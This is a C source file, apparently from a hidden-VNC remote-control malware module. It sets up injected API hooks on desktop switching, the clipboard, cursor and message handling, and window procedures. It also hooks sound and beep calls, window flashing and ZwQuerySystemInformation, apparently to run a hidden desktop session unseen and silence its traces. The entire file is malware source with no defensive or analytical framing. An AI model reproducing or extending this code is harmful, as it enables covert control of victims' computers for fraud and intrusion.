#include "injlib.h"
#include "vncmsg.h"
#include "hidevncprocwnd.h"
#include "vncsilence.h"
#include "vncclipboard.h"
#include "hooks.h"

void DoVNCHooks()
{
    VNC_HOOKS VNCHooks;
    ADD_HOOK(VNCHooks,OpenDesktopA);
    ADD_HOOK(VNCHooks,OpenDesktopW);
    ADD_HOOK(VNCHooks,OpenInputDesktop);
    ADD_HOOK(VNCHooks,SwitchDesktop);

    ADD_HOOK(VNCHooks,PlaySoundW);
    ADD_HOOK(VNCHooks,PlaySoundA);
    ADD_HOOK(VNCHooks,sndPlaySoundW);
    ADD_HOOK(VNCHooks,sndPlaySoundA);
    ADD_HOOK(VNCHooks,Beep);
    ADD_HOOK(VNCHooks,MessageBeep);
    ADD_HOOK(VNCHooks,waveOutOpen);

    LPVOID GetUpdatedClipboardFormats=GetProcAddress(GetModuleHandle(_T("user32")),"GetUpdatedClipboardFormats");
    ADD_HOOK(VNCHooks,GetUpdatedClipboardFormats);
    ADD_HOOK(VNCHooks,CloseClipboard);
    ADD_HOOK(VNCHooks,CountClipboardFormats);
    ADD_HOOK(VNCHooks,CountClipboardFormats);
    ADD_HOOK(VNCHooks,EmptyClipboard);
    ADD_HOOK(VNCHooks,GetClipboardData);
    ADD_HOOK(VNCHooks,GetPriorityClipboardFormat);
    ADD_HOOK(VNCHooks,IsClipboardFormatAvailable);
    ADD_HOOK(VNCHooks,OpenClipboard);
    ADD_HOOK(VNCHooks,SetClipboardData);

    ADD_HOOK(VNCHooks,FlashWindowEx);
    ADD_HOOK(VNCHooks,FlashWindow);
    ADD_HOOK(VNCHooks,GetCursorPos);
    ADD_HOOK(VNCHooks,SetCursorPos);
    ADD_HOOK(VNCHooks,GetMessagePos);
    ADD_HOOK(VNCHooks,SetCapture);
    ADD_HOOK(VNCHooks,ReleaseCapture);
    ADD_HOOK(VNCHooks,GetCapture);
    ADD_HOOK(VNCHooks,DefWindowProcW);
    ADD_HOOK(VNCHooks,DefWindowProcA);
    ADD_HOOK(VNCHooks,DefDlgProcW);
    ADD_HOOK(VNCHooks,DefDlgProcA);
    ADD_HOOK(VNCHooks,DefFrameProcW);
    ADD_HOOK(VNCHooks,DefFrameProcA);
    ADD_HOOK(VNCHooks,DefMDIChildProcW);
    ADD_HOOK(VNCHooks,DefMDIChildProcA);
    ADD_HOOK(VNCHooks,CallWindowProcW);
    ADD_HOOK(VNCHooks,CallWindowProcA);
    ADD_HOOK(VNCHooks,GetMessageW);
    ADD_HOOK(VNCHooks,GetMessageA);
    ADD_HOOK(VNCHooks,PeekMessageW);
    ADD_HOOK(VNCHooks,PeekMessageA);
    ADD_HOOK(VNCHooks,TranslateMessage);
    ADD_HOOK(VNCHooks,SetDIBitsToDevice);

    ADD_HOOK(VNCHooks,TrackPopupMenuEx);

    ADD_HOOK(VNCHooks,GetCaretBlinkTime);

    InitVNCHooks(&VNCHooks);
    return;
}

void DoCommonHooks()
{
    COMMON_HOOKS CommonHooks;
    ADD_HOOK(CommonHooks,ZwQuerySystemInformation);
    ADD_HOOK(CommonHooks,SetThreadDesktop);
    ADD_HOOK(CommonHooks,ShowWindow);
    InitCommonHooks(&CommonHooks);
    return;
}

